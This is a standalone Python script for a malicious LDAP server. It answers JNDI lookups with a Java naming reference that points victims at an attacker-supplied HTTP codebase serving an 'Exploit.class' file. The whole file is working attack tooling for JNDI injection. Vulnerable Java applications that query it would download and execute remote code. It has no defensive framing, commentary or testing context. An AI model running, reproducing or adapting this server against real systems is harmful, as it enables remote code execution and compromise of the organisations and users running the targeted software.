#!/usr/bin/env python3
import socket
import sys

def create_response(codebase):
    codebase = codebase.encode() if isinstance(codebase, str) else codebase
    if not codebase.endswith(b'/'): codebase += b'/'

    def length(n):
        return bytes([n]) if n < 128 else bytes([0x81, n])

    def string(s):
        s = s.encode() if isinstance(s, str) else s
        return b'\x04' + length(len(s)) + s

    def seq(items):
        data = b''.join(items)
        return b'\x30' + length(len(data)) + data

    def attr(name, val):
        return seq([string(name), b'\x31' + length(len(string(val)) ) + string(val)])

    attrs = seq([
        attr("javaClassName", b"Exploit"),
        attr("javaCodeBase", codebase),
        attr("objectClass", b"javaNamingReference"),
        attr("javaFactory", b"Exploit"),
    ])

    entry = string("") + attrs
    search_entry = b'\x64' + length(len(entry)) + entry
    search_done = b'\x65\x07\x0a\x01\x00\x04\x00\x04\x00'
    msg_id = b'\x02\x01\x02'

    return seq([msg_id, search_entry]) + seq([msg_id, search_done])


def handle(client, http_url):
    try:
        client.recv(1024)
        client.send(bytes([0x30,0x0c,0x02,0x01,0x01,0x61,0x07,0x0a,0x01,0x00,0x04,0x00,0x04,0x00]))
        client.recv(1024)
        client.send(create_response(http_url))
        print(f"Redirected to {http_url}Exploit.class")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()


def main():
    port = int(sys.argv[1])
    http_url = sys.argv[2]

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)

    print(f"LDAP server on :{port} -> {http_url}")

    while True:
        client, addr = server.accept()
        print(f"Connection from {addr[0]}")
        handle(client, http_url)


if __name__ == "__main__":
    main()